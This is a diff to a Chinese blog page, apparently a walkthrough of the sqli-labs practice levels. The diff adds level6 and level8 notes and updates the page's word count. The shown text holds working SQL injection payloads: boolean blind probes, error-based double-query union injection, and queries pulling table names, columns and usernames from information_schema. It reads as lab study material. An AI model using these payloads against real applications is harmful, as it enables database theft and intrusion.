@@ -184,7 +184,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      703 字
+      797 字
     </span>
   
 
@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      10
+      11
        分钟
     </span>
   
@@ -249,6 +249,10 @@
 <p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>1&#39;and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&gt;97%23</code>（第一个）表的（第一个）字符        </p>
 <p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>?id=1&#39;and (ascii(substr((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1)))&gt;65%23</code>（users）下（第一列）的（第一个）字符       </p>
 <p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code><br><code>1&#39;and (ascii(substr((select username from security.users limit 0,1),1,1)))&gt;65%23</code>         </p>
+<h2 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h2><p>GET-Double injection-Double Quotes-String<br>GET-双重注入-双重引号-字符串<br>相较于level5，单引号改为双引号<br>测试<code>?id=1&quot; union SELECT null,count(*),concat((select group_concat(schema_name) from information_schema.schemata ),floor(rand()*2))as a from information_schema.tables group by a%23</code>可以正常得到库名     </p>
+<p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code>    </p>
+<h2 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h2><p>GET - Blind - Boolian Based - Single Quotes<br>基于布尔的盲注-单引号<br>测试<code>?id=1&#39; and length(database())&gt;8%23</code>正常      </p>
+<p><code>.......................................................</code><br><code>.........................................</code><br><code>...................</code>    </p>
 
             </div>
             <hr>
